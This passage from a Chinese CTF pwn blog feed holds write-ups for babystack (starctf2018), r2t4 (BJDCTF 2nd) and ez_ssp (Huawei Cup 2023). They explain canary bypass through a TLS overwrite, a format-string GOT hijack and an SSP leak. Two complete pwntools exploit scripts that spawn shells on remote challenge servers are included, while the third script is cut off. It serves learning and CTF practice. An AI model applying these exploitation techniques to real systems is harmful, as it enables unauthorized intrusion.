段的首地址处），由于出栈操作使 RSP + 8 让 RSP 指向 <code>target_addr</code> 的位置</p><p>然后通过 <code>ret</code> 指令执行我们写在 BSS 段上的 <code>system(&quot;/bin/sh&quot;)</code></p><blockquote><p><strong>其实只要保证 <code>read()</code> 写入的地方在 EBP 迁移过去的地址的下一地址处即可</strong></p><p>如果对栈迁移的流程不太清楚，可以查看本站《<a href="%E6%A0%88%E8%BF%81%E7%A7%BB.md">栈迁移</a>》一文的 <em>《可以覆盖到返回地址》</em> 部分</p></blockquote><p>但实际操作时发现，我们确实已经成功构造了 <code>system(&quot;/bin/sh&quot;)</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack12.png" alt="【starctf2018】babystack12.png"></p><p>但是会在 <code>do_system()</code> 中发生段错误，导致无法 getshell</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack13.png" alt="【starctf2018】babystack13.png"></p><p>暂时不知道错误发生的原因</p><p>但是通过 one_gadget 执行 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 是可以 getshell 的</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack14.png" alt="【starctf2018】babystack14.png"></p><p>这几个都尝试了一下，发现 <code>one_gadget_libc = 0x4f322</code> 是可以的</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bs'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/opt/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bs"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">26929</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>bss_start <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bss_start -->"</span><span class="token punctuation">,</span> bss_start<span class="token punctuation">)</span>target_addr <span class="token operator">=</span> bss_start <span class="token operator">+</span> <span class="token number">0x8</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"target_addr -->"</span><span class="token punctuation">,</span> target_addr<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400c03</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x400c01</span>leave_ret <span class="token operator">=</span> <span class="token number">0x400955</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>read_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>offset <span class="token operator">=</span> <span class="token number">0x1850</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many bytes do you want to send?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 构造 payload 至少需要 0x1850 的长度</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1008</span>   <span class="token comment"># 填充 0x1008 个垃圾数据到达 Canary</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>   <span class="token comment"># 0xdeadbeef 是被我们修改后的 Canary</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>target_addr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span>   <span class="token comment"># 当前 rbp 的位置，填写栈迁移的地址</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x1848</span><span class="token punctuation">,</span> <span class="token string">b"a"</span><span class="token punctuation">)</span>   <span class="token comment"># 长度填充到 0x1848 到达 TLS 中 Canary 的位置</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>   <span class="token comment"># 修改 TLS 中的 stack_guard，也就是 Canary</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>   <span class="token comment"># payload 长度刚好 0x1850，因此不要用 sendline</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"It's time to say goodbye.\n"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget_libc <span class="token operator">=</span> <span class="token number">0x4f322</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>one_gadget_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> one_gadget_libc   <span class="token comment"># 根据 libc 偏移计算 one_gadget 真实地址</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token comment"># payload = p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span>debug<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{4f062841-5776-44e5-b0fc-adab7593184b}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack7.png" alt="【starctf2018】babystack7.png"></p>]]></content>
    
    
    <summary type="html">通过修改 TLS 结构体中的 stack_guard 变量来控制 Canary，前提是溢出空间足够长并且存在子线程，但是这个题成功构造 system(&quot;/bin/sh&quot;) 却无法 getshell，必须使用 execve(&quot;/bin/sh&quot;, 0, 0)</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Bypass" scheme="https://www.uf4te.cn/tags/Bypass/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="栈迁移" scheme="https://www.uf4te.cn/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>【BJDCTF 2nd】r2t4</title>
    <link href="https://www.uf4te.cn/posts/a0efa060.html"/>
    <id>https://www.uf4te.cn/posts/a0efa060.html</id>
    <published>2024-05-14T06:14:52.000Z</published>
    <updated>2024-06-05T06:36:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>存在 Canary 保护，只能使用一次格式化字符串漏洞，但没有开 PIE，因此想到劫持 <code>__stack_chk_fail</code> 的 GOT 表地址为后门函数的地址</li></ul><hr><p><a href="https://buuoj.cn/challenges#[BJDCTF%202nd]r2t4">【BJDCTF 2nd】r2t4</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看保护机制：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%201.png" alt="【BJDCTF 2nd】r2t4 1.png"></p><p>尝试运行，明显存在溢出：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%202.png" alt="【BJDCTF 2nd】r2t4 2.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%203.png" alt="【BJDCTF 2nd】r2t4 3.png"></p><p>明显 <code>buf</code> 处存在溢出，且 <code>printf(buf)</code> 存在格式化字符串漏洞</p><p>存在一个后门函数 <code>backdoor()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%204.png" alt="【BJDCTF 2nd】r2t4 4.png"></p><p>但这里 <code>buf</code> 溢出的长度有限，只能刚好覆盖返回地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%205.png" alt="【BJDCTF 2nd】r2t4 5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%206.png" alt="【BJDCTF 2nd】r2t4 6.png"></p><p>考虑到 <code>Partial RELRO</code>，并且存在格式化字符串漏洞，且只能使用一次格式化字符串漏洞</p><p>因此尝试劫持 <code>__stack_chk_fail</code> 函数的 GOT 表地址为后门函数 <code>backdoor()</code> 的地址</p><p>由于是 64 位程序，根据栈的布局可知，输入的格式化字符串偏移为 6</p><blockquote><p>如果对格式化字符串漏洞不熟悉的话，可以看看本站《<a href="%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A8.md">格式化字符串漏洞与利用</a>》一文</p></blockquote><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./r2t4"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.29.so"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./r2t4"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">28170</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"backdoor"</span><span class="token punctuation">]</span>__stack_chk_fail_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__stack_chk_fail"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>__stack_chk_fail_got_addr<span class="token punctuation">:</span> backdoor_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{90b19213-0fe1-4802-a73f-7e4f38962e88}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%207.png" alt="【BJDCTF 2nd】r2t4 7.png"></p>]]></content>
    
    
    <summary type="html">程序存在 Canary 保护，只能使用一次格式化字符串漏洞，但没有开 PIE，溢出也只能刚好覆盖到返回地址，因此想绕过 Canary 构造 ROP 很困难，但可以劫持 __stack_chk_fail 的 GOT 表地址为后门函数的地址</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Bypass" scheme="https://www.uf4te.cn/tags/Bypass/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>【华为杯 2023】ez_ssp</title>
    <link href="https://www.uf4te.cn/posts/12245599.html"/>
    <id>https://www.uf4te.cn/posts/12245599.html</id>
    <published>2024-05-13T02:13:27.000Z</published>
    <updated>2024-06-05T06:36:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>利用 glibc-all-in-one 和 patchelf 修改二进制文件的 libc 版本</mark></p></li><li><p><mark>GDB 进行多进程的调试方法</mark></p></li><li><p>利用 SSP Leak 绕过 Canary，修改 <code>__fortify_fail</code> 函数中要输出的变量 <code>__libc_argv[0]</code> 的地址，故意触发 Canary 保护实现任意地址读</p></li><li><p><mark>libc 中存在着一个 <code>environ</code> 函数，它是一个全局变量，储存着系统的环境变量，通过泄露 <code>environ</code> 的真实地址处的值可以得到栈上存储的环境变量的首地址</mark></p></li></ul><hr><p>今天整理笔记的时候找例题突然想起了去年华为杯有一道类似的题，不过链接早就不记得啦，需要原题二进制文件的去网上搜搜看有没有吧，或者邮箱找我要也可以</p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><blockquote><p>由于是本地复现，这个 SSP Leak 依赖于 Glibc 版本，详情可查看本站《<a href="Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6.md">Bypass安全机制</a>》一文的 <em>《SSP Leak 绕过 Canary》</em> 部分</p><p>因此，我们需要先使用 patchelf 更改题目的二进制程序使用的 libc 版本，具体操作详情可查看本站《<a href="Pwntools%E4%B8%8Eexp%E6%8A%80%E5%B7%A7.md">Pwntools与exp技巧</a>》一文的 <em>《glibc-all-in-one 和 patchelf》</em> 部分</p></blockquote><p>该题给出了 Glibc 版本为 2.23</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp1.png" alt="华为杯2023-ez_ssp1.png"></p><p>由于 SSP Leak 在 Ubuntu 22.04 本地是无法复现的，因为 Glibc 2.35 修复了这个问题（不过 Ubuntu 16.04 的 Glibc 2.23 可以）</p><p>首先通过 glibc-all-in-one 下载 <code>2.23-0ubuntu11.3_amd64</code> 版本的 libc，并通过 patchelf 替换：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp2.png" alt="华为杯2023-ez_ssp2.png"></p><p>安全机制：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp4.png" alt="华为杯2023-ez_ssp4.png"></p><p>在 IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp3.png" alt="华为杯2023-ez_ssp3.png"></p><p>程序会先打开本地的 flag 文件并读取内容，保存到 <code>s</code> 中，<code>s</code> 位于栈上</p><p><strong>由于我们本地没有 flag 文件，所以需要自己创建一个，否则程序运行会报错，我们也无法进行调试</strong></p><p>flag 内容随便写：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp5.png" alt="华为杯2023-ez_ssp5.png"></p><p>首先根据 <code>v3</code> 生成随机数 <code>v7</code>，然后将我们输入的 <code>buf</code> 与 <code>v7</code> 一起作为 <code>sub_400A65()</code> 的参数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp6.png" alt="华为杯2023-ez_ssp6.png"></p><p>可以看到这个函数也是用来生成随机数的，将随机数返回赋值给 <code>v9</code></p><p>然后将 flag 和 <code>v9</code> 一起执行 <code>sub_400AB0(s, v9, 50)</code>，根据前面读取 flag 的长度为 <code>0x32</code> 可以得知，这里的 <code>50</code> 是读取 flag 的长度</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp7.png" alt="华为杯2023-ez_ssp7.png"></p><p>这个函数将 flag 的每一位与随机数 <code>v9</code> 进行了异或，差不多可以理解为异或加密了一下</p><p>然后有一个 for 循环，可以循环 3 次，每次都会通过 <code>fork()</code> 函数生成一个子进程</p><blockquote><p>注意：<strong>子进程崩溃不会导致父进程退出</strong></p><p>因此我们相当于有 3 次覆盖 Canary 的机会，但是想修改返回地址依然是没有意义的，因为子进程会崩溃</p></blockquote><p>每轮循环有两次输入，第一个 <code>buf</code> 处明显没有溢出，但第二个 <code>gets(v12)</code> 存在明显溢出</p><p>栈中的情况：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp8.png" alt="华为杯2023-ez_ssp8.png"></p><p>静态信息获取差不多了，接下来就需要进行动态调试了</p><blockquote><p>注意，这里涉及到多进程，需要进行多进程的 GDB 动态调试，如果不熟悉的话，可以看看本站《<a href="GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A8.md">GDB的基础和使用</a>》一文中的 <em>《fork 多进程调试》</em> 部分</p></blockquote><p>为了便于我们调试，我们首先将 GDB 设置如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> follow-fork-mode child   <span class="token comment"># fork 之后调试子进程，父进程不受影响</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> detach-on-fork off   <span class="token comment"># 同时调试父进程和子进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后在 <code>gets()</code> 的 <code>0x400CAC</code> 处下断点：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp9.png" alt="华为杯2023-ez_ssp9.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp10.png" alt="华为杯2023-ez_ssp10.png"></p><p>第一个输入不存在溢出，我这里输入 <code>uf4te</code></p><p>第二个输入需要计算偏移，我这里输入 <code>aaaaaaaa</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp11.png" alt="华为杯2023-ez_ssp11.png"></p><p>根据触发 Canary 会输出文件名，RBP 下面那一串文件路径就是我们所说的 <code>__libc_argv[0]</code>，也可以在 GDB 中进行验证：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp12.png" alt="华为杯2023-ez_ssp12.png"></p><p>计算偏移得到第二次输入与 <code>__libc_argv[0]</code> 之间的距离，需要填充 <code>0x128</code> 个垃圾字符进行覆盖</p><p>虽然程序没有开 PIE，但是栈地址是随机的，因此我们还需要用到 libc 中的 <code>environ</code> 函数帮助我们计算栈偏移</p><blockquote><p>关于 <code>environ</code> 函数的详细介绍见本站的《<a href="Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6.md">Bypass安全机制</a>》一文中 <em>《SSP Leak 绕过 Canary》</em> 部分</p></blockquote><p>因此，我们需要首先获取 <code>environ</code> 函数的真实地址，这里选择先泄露一个 <code>read()</code> 函数的真实地址，然后进行 libc 基地址的计算即可</p><p>将 <code>__libc_argv[0]</code> 覆盖为 <code>read_got_addr</code>，然后由于触发 Canary 会将 <code>read()</code> 函数的真实地址泄露出来</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp13.png" alt="华为杯2023-ez_ssp13.png"></p><p>计算得到 <code>environ</code> 函数的真实地址后，再将 <code>__libc_argv[0]</code> 覆盖为 <code>environ</code> 函数的真实地址，泄露出栈上环境变量的首地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp14.png" alt="华为杯2023-ez_ssp14.png"></p><p>在栈中可以进行验证：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp15.png" alt="华为杯2023-ez_ssp15.png"></p><p>往上翻可以看到 flag 存储的位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp16.png" alt="华为杯2023-ez_ssp16.png"></p><p>计算栈上环境变量的首地址与 flag 存储位置之间的偏移</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp17.png" alt="华为杯2023-ez_ssp17.png"></p><p>因此 <code>flag_addr = stack_addr - 0x178</code></p><p>第三次循环我们直接将 <code>__libc_argv[0]</code> 覆盖为 <code>flag_addr</code>，将 flag 打印出来</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp18.png" alt="华为杯2023-ez_ssp18.png"></p><p>不过这里的 flag 是加密后的，我们再将其异或还原即可</p><p>由于异或的参数与随机数有关，记得将 <code>random id</code> 记录下来：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp19.png" alt="华为杯2023-ez_ssp19.png"></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token 